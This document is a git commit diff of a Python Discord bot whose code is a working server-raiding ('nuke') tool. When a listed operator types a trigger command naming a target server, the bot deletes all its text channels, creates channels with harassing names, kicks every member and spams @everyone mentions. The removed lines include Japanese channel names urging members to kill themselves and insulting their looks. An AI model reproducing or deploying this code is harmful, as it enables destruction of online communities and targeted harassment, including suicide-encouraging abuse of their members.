bda2fb9eaf5981b255737d1f65657914e67d9485
K.K <102584033+I-am-a-cool-guy@users.noreply.github.com>
2023-03-11 21:11:35 +0900

    Update app.py

--- app.py
+++ app.py
@@ -1,76 +1,91 @@
-import discord
 from discord.ext import commands
+import discord
+import asyncio
 import random
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=[""],intents=intents)
-bot.remove_command("help")
+bot = commands.Bot(command_prefix=["!",""],intents=intents)
 
 @bot.event
 async def on_message(message):
-  if message.guild:
-        bot_author = "User name" , "name2" ,"name3..."
-        if message.author.name in bot_author:
-          if message.content.startswith("guild_spam"):
+    if message.author.bot:
+        return
+    else:
+        bot_author = "name1","name2","name3"
+        if not message.author.name in bot_author:
+            return
+        else:
+            if message.content.startswith("guild_spam"):
 
-            if message.content.split()[1] == "ID":
-              print(message.content.split()[2])
-              guild_name = bot.get_guild(int(message.content.split()[2]))
-              print(guild_name)
-            else:
-              print(message.content.split()[1])
-              guild_name = discord.utils.get(bot.guilds, name=str(message.content.split()[1]))
-              print(guild_name)
-
-            for T in range(0,len (guild_name.text_channels)):
-              print(guild_name.text_channels[T])
-            try:
-              await guild_name.text_channels[T].delete()
-              print(f"{guild_name.text_channels[T]} | delete")
-              LobbyName = "このサーバー、社不しかいないね"
-              Category = await guild_name.create_category(LobbyName)
-              await Category.create_text_channel("自殺しよ？")
-              await Category.create_text_channel("お前は生き恥だ")
-              await Category.create_text_channel("早く死んで！w 顔キモイよ！")
-              Category = await guild_name.create_category(LobbyName)
-              await Category.create_text_channel("死にな")
-              await Category.create_text_channel("首吊って死ね")
-              await Category.create_text_channel("死んだらイイ事アルヨ")
-              Category = await guild_name.create_category(LobbyName)
-              await Category.create_text_channel("死んでくれ！")
-              await Category.create_text_channel("けつの穴みたいな顔してる")
-              await Category.create_text_channel("毎日風呂入れよ汚いな")
-              Category = await guild_name.create_category(LobbyName)
-              await Category.create_text_channel("歯磨きしてる？歯、黄色いよ？")
-              await Category.create_text_channel("虫歯予防しようね！")
-              await Category.create_text_channel("イキってモンエナ飲んでそうだなお前ら")
-              print("チャンネル削除、カテゴリー生成、チャンネル生成成功")
-            except:
-              print("カテゴリー生成失敗しちゃった、")
-              pass
-              
-              await message.channel.send(f"__{str(guild_name)}__\n ping __{round(bot.latency * 1000)}__ms:arrows_counterclockwise:")
-              count = 0
-              error_count = 0
+                if message.content.split()[1] == "ID":
+                    print(message.content.split()[2])
+                    guild_name = bot.get_guild(int(message.content.split()[2]))
+                    print(guild_name)
+                else:
+                    print(message.content.split()[1])
+                    guild_name = discord.utils.get(bot.guilds, name=str(message.content.split()[1]))
+                    print(guild_name)
+                channel_delete_err = 0
+                channel_delete = 0
+                for T in range(0,len (guild_name.text_channels)):
+                    try:
+                        await guild_name.text_channels[T].delete()
+                        print(f"{guild_name.text_channels[T]}delete")
+                        channel_delete = channel_delete + 1
+                    except:
+                        print(f"{channel_delete_err} チャンネル削除失敗")
+                        channel_delete_err = channel_delete_err + 1
+                        pass
+                print(f"channel delete,{channel_delete}")
+                try:
+                    category_count_err = 0
+                    await guild_name.create_text_channel("初鯖チム10")
+                    await guild_name.create_text_channel("原神リーク")
+                    await guild_name.create_text_channel("原神チート販売")
+                    await guild_name.create_text_channel("原神アカウント販売")
+                    await guild_name.create_text_channel("原神課金代行")
+                    await guild_name.create_text_channel("ポジ種ヤバ交尾会場")
+                    await guild_name.create_text_channel("ゲイ界隈")
+                    await guild_name.create_text_channel("APEX談合")
+                    await guild_name.create_text_channel("APEXチート販売")
+                    await guild_name.create_text_channel("ランク")
+                    await guild_name.create_text_channel("アリーナ談合")
+                    await guild_name.create_text_channel("ランク代行")
+                    await guild_name.create_text_channel("爪ダブ代行")
+                except:
+                    category_count_err = category_count_err + 1
+                    print(f"ERROR{category_count_err}")
+                    pass
+                await asyncio.sleep(2)
+                kick_error = 0
+                kick_pass = 0
+                for U in range(0,len (guild_name.members)):
+                    try:
+                        await guild_name.members[U].kick()
+                        print(f"kick ~ {guild_name.members[U]} err>{kick_error}")
+                        kick_pass = kick_pass + 1
+                    except:
+                        kick_error = kick_error + 1
+                        print(f"{kick_error}ERROR")
+                        pass
+                count = 0
+                error_count = 0
                 while count<100:
 
-                    for guild_Length in range(0, len(guild_name.text_channels)):
+                    for G in range(0, len(guild_name.text_channels)):
                         try:
-                            user = random.choice(guild_name.text_channels[guild_Length].members)
-                            await guild_name.text_channels[guild_Length].send(f"@everyone {user.mention}")
+                            user = random.choice(guild_name.members)
+                            await guild_name.text_channels[G].send(f"@everyone {user.mention}")
+                            print(guild_name.text_channels[G],user,count)
                             count = count + 1
-                            try:
-                                await user.kick()
-                                print(f"{user}をkick")
-                            except:
-                                pass
                         except:
                             print(f"error:{error_count}")
                             count = count + 1
                             error_count = error_count + 1
                             pass
 
-                print(f"{str(guild_name)}|{count}回中{count - error_count}回成功")
+                print(f"{str(guild_name)}|{count}回中{count - error_count}回成功\n")
+                await message.author.send(f"{str(guild_name)}**__{count}__**回中**__{count - error_count}__回**成功\nmember_kick({kick_pass})\n消去したチャンネル数{channel_delete}\nチャンネル生成数{13 - category_count_err}")
 
 
 bot.run("TOKEN")
